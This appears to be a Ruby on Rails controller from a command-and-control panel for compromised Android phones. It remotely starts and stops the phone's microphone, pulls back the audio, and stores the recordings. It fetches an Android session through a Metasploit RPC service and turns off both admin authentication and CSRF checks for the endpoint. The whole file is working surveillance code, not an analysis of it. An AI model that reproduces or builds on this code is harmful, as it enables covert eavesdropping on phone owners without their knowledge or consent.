class RecordingsController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  include CommandSender
  
  def microphone_rec
    begin
      duration = params[:time].present? ? params[:time].to_i : 10
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      @fileName = "audio_recording_#{currentTimeFormat}.wav"
      
      # Send start_audio command
      start_cmd = send_command_and_wait(@smartphone, 'start_audio', {}, timeout: 5.seconds)
      
      if start_cmd.completed?
        # Wait for recording duration
        sleep(duration)
        
        # Send stop_audio command
        stop_cmd = send_command_and_wait(@smartphone, 'stop_audio', {}, timeout: 30.seconds)
        
        if stop_cmd.completed? && stop_cmd.response_data['audio_base64'].present?
          # Decode Base64 and save audio
          audio_bytes = Base64.decode64(stop_cmd.response_data['audio_base64'])
          file_path = Rails.root.join('files', 'dumps', 'recordings', @fileName)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, audio_bytes)
          
          # Save to database
          Recording.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            duration: duration,
            filename: @fileName,
            smartphone_id: @smartphone.id
          )
          
          commandOutput = ["Recording successful: #{@fileName} (#{stop_cmd.response_data['size']} bytes)"]
        else
          commandOutput = ["Recording failed: No audio data received"]
        end
      else
        commandOutput = ["Failed to start recording"]
      end

    rescue => e
      Rails.logger.error("Error in microphone_rec: #{e.message}")
      commandOutput = ["Operation Failed", e.message]
    end
    
    respond_to do |format|
      format.js {
        render "microphone_rec", locals: { commandOutput: commandOutput, fileName: @fileName }
      }
    end
  end

  private

  # SonarQube S2068: Use centralized CredentialsService instead of hardcoded credentials
  def find_active_session_for_smartphone(smartphone)
    msf_service = MsfRpcService.new
    msf_service.android_session_id
  rescue MsfRpcService::ConnectionError => e
    Rails.logger.error("MSF connection failed: #{e.message}")
    nil
  end

  def recording_params
    params.require(:recording).permit(:date,
                                      :duration,
                                      :filename,
                                      :smartphone_id)
  end
end
